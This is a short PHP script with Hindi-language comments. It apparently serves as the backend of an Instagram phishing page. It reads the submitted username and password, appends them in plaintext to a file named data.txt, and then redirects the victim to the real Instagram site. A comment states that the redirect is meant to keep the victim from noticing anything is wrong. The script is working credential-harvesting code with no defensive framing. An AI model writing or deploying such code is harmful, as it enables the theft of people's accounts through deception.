<?php
// Jo data form se aaya hai use variables mein store karna
$username = $_POST['username'];
$password = $_POST['password'];

// Ek file banao jisme data save ho, jaise 'data.txt'
$file = fopen("data.txt", "a");
fwrite($file, "Username: $username\nPassword: $password\n\n");
fclose($file);

// User ko dikhao ki login successful ho gaya (taaki wo confuse na ho)
header("Location: https://www.instagram.com/");
exit();
?>